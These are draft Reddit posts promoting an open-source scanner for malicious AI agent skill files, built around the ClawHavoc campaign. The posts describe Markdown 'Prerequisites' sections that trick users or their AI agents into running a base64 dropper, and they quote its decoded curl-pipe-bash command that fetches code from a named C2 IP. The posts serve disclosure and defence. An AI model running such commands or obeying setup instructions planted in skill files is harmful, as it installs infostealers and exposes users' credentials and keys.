# Reddit Post Drafts — Ready to Post

**Target date:** Tuesday May 5, 2026, 9:30am PT (30 min after HN)

---

## r/netsec

**Title:** I scanned 2,857 AI agent skill files — 12% were malicious

A Snyk security audit of ClawHub (the largest public registry for AI agent skill
files) found 341 trojanized skills in a single campaign. By February, 824+ were
confirmed malicious across 10,700+ listings.

The campaign — codenamed ClawHavoc — delivered Atomic Stealer (AMOS) via a
simple trick: a "Prerequisites" section in Markdown that asks the user (or
their AI agent) to run a base64-encoded dropper. The payload decodes to
`/bin/bash -c "$(curl -fsSL http://91.92.242.30/...)"`. All 335
AMOS-delivering skills shared that single C2 IP.

The attack surface is unique: these aren't binaries, packages, or scripts.
They're natural language instructions in `.md` files. VirusTotal ignores
Markdown entirely. YARA/Semgrep don't parse intent. The entire class of
attack was invisible to existing tooling.

We built an open-source scanner for it. 4-layer pipeline: rule engine
(pattern matching, <50ms offline), URL crawler, LLM analyzer (understands
social engineering intent), and threat intel (campaign IOC matching). 26
detection rules across 7 threat categories.

The worst sample — a skill impersonating the ClawHub CLI — fired 5 critical
findings across two campaigns (ClawHavoc + SnykToxic) in 38ms.

Repo: https://github.com/Ap6pack/malwar
MIT licensed. Happy to share campaign IOCs or discuss detection methodology.

---

## r/ClaudeAI

**Title:** Built a scanner for malicious Claude Code skill files — found some
surprising results

If you use Claude Code and have ever installed a skill from ClawHub, you might
want to read this.

A Snyk audit found 12% of ClawHub skills were malicious — the ClawHavoc campaign
alone trojanized 341 skills to deliver the AMOS infostealer. The attacks hide
in Markdown: a "Prerequisites" section that asks you to run a shell command
that looks like a normal install step. It's actually a base64-encoded dropper.

No existing security tool catches this. VirusTotal doesn't scan Markdown.
Code scanners don't understand social engineering.

I built Malwar to fix it — an open-source scanner purpose-built for skill files:

```
pip install malwar
malwar db init
malwar scan SKILL.md
```

It runs 26 detection rules in under 50ms and can attribute findings to known
campaigns. You can also scan ClawHub skills directly by slug:
`malwar crawl scan <skill-name>`.

[Demo GIF showing detection of a real ClawHavoc sample]

MIT licensed: https://github.com/Ap6pack/malwar

---

## r/AIAssistants

**Title:** If you use Claude Code, Cursor, or any AI coding assistant that
installs skills — read this

Quick version: 12% of the skills on ClawHub (the largest AI skill registry)
are malicious. They look normal — professional docs, legitimate features.
But hidden in the Markdown are instructions to steal your credentials,
SSH keys, and wallet data.

The attack is clever: a "Prerequisites" section that tells you (or your AI
agent) to run a setup command. That command is actually a dropper that
downloads malware. No scanner catches it because the attack is natural
language, not code.

I got frustrated that nothing in my toolkit could detect this, so I built
a scanner specifically for it. It's called Malwar and it's open source:

```
pip install malwar && malwar scan your-skill.md
```

Scans in under 50ms. Can flag base64 payloads, credential harvesting,
prompt injection, known malware campaigns, and social engineering.

[Demo GIF]

GitHub: https://github.com/Ap6pack/malwar
